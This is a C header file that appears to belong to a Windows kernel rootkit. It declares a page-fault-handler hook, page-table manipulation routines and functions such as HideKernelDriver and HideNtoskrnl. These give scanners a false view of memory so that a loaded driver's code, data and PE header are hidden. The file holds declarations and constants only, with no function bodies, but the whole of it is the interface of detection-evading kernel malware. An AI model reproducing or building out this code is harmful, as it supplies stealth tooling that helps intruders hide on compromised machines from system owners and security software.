#ifndef __mmHook_h__
#define __mmHook_h__

//############################################
// KNOWN LIMITATION AND RESTRICTIONS
// 1. No Multiprocessor Support
// 2. No PAE Support
// 3. No Hyperthreading Support
//############################################


//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
///////////////////////////////// CONSTANTS //////////////////////////////////
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#define NTOSKRNL_PAGE						0x80400000
#define LARGE_PAGE_SIZE						0x00400000
#define	PROCESS_PAGE_DIR_BASE				0xC0300000
#define PROCESS_PAGE_TABLE_BASE				0xC0000000
#define HIGHEST_USER_ADDRESS				0x7FFF0000
#define LOWEST_ADDRESS_IN_LARGE_PAGE_RANGE  0X80000000
#define HIGHEST_ADDRESS_IN_LARGE_PAGE_RANGE	0x9FFFFFFF
#define MAX_NUMBER_OF_HOOKED_PAGES			128
#define NUM_HASH_BITS						12 //32 - log10(MAX_NUMBER_OF_HOOKED_PAGES) / log10(2)

//PE section characteristics
#define EXECUTABLE							0x20000000
#define WRITABLE							0x80000000
#define DISCARDABLE							0x2000000

//user options for kernel driver hiding
#define HIDE_CODE		0x00000001 // PE .text sections
#define HIDE_DATA		0x00000002 // PE .data sections
#define HIDE_HEADER		0x00000004 // PE header
#define HIDE_SPECIAL	0x00000008 // user defined sections
#define HIDE_ALL		0x00000010 // hide all but discardable sections in the PE

#define MAX_NUMBER_OF_PE_SECTIONS			20

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
///////////////////////////////// ERROR CODES //////////////////////////////////
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

#define ERROR_INCONSISTENT_PAGE_SIZE_ACROSS_RANGE -1
#define	ERROR_PTE_NOT_PRESENT	-2
#define	ERROR_PAGE_NOT_PRESENT	-3
#define ERROR_INVALID_PARAMETER -4
#define ERROR_PAGE_NOT_IN_LIST -5
#define ERROR_EMPTY_LIST		-6
#define ERROR_DRIVER_SECTIONS_MUST_BE_PAGE_ALIGNED  -7
#define ERROR_DISCARDABLE_SECTION -8
#define ERROR_CANT_INSERT_CALL -9

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//////////////////////////////// DATA STRUCTURES /////////////////////////////
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

typedef unsigned long* PPTE;

typedef struct _HOOKED_LIST_ENTRY
{
	_HOOKED_LIST_ENTRY* pNextEntry;
	PVOID pExecuteView;
	PVOID pReadWriteView;
	PPTE pExecutePte;
	PPTE pReadWritePte;
	PVOID pfnCallIntoHookedPage;
	ULONG pDriverStarts;    
	ULONG pDriverEnds;
} HOOKED_LIST_ENTRY, *PHOOKED_LIST_ENTRY; 

    
 
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//////////////////// LOW LEVEL INTERFACE FUNCTIONS ///////////////////////////
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

void HookMemoryPage( PVOID pExecutePage, PVOID pReadWritePage, PVOID pfnCallIntoHookedPage, PVOID pDriverStarts, PVOID pDriverEnds );
void UnhookMemoryPage( PVOID pExecutePage );
PVOID AllocateViewOfPage( PVOID VirtualAddress, bool DuplicatePageContents, ULONG* pAllocatedMemory );
void DeallocateViewOfPage( PVOID VirtualAddress );
PVOID RoundDownToPageBoundary( PVOID VirtualAddress );
PVOID RoundUpToPageBoundary( PVOID VirtualAddress );
int GetNumberOfPagesInRange( PVOID LoVirtualAddress, PVOID HiVirtualAddress );



//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//////////////////// HIGH LEVEL INTERFACE FUNCTIONS ////////////////////////
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

int HideKernelDriver(char* DriverName, int Options);
int UnhideKernelDriver(void);
int HideDriverSection( ULONG pDriverSectionHeader );
void HideDriverHeader( ULONG pDriverHeader );
void HideNtoskrnl();

//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
/////////////////////////////// SUPPORT FUNCTIONS ////////////////////////////
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

void NewInt0EHandler( void ); //page fault handler

//Functions to manage PTE's
PPTE GetPteAddress( PVOID VirtualAddress );
bool IsInLargePage( PVOID VirtualAddress );
void DisableGlobalPageFeature( PPTE pPte );
void EnableGlobalPageFeature( PPTE pPTE );
void MarkPageNotPresent( PPTE pPte );
void MarkPagePresent( PPTE pPte );
void MarkPageReadWrite( PPTE pPte );
void MarkPageReadOnly( PPTE pPte );
ULONG GetPhysicalFrameAddress( PPTE pPte );
void ReplacePhysicalFrameAddress( PPTE pPte, ULONG* oldFrame, ULONG newFrame);

//Functions to manage the list of hooked memory pages
void PushPageIntoHookedList( HOOKED_LIST_ENTRY pHookedPage );
HOOKED_LIST_ENTRY* PopPageFromHookedList( int index );
HOOKED_LIST_ENTRY* FindPageInHookedList( ULONG VirtualAddress );
void FreeHookedList();

#endif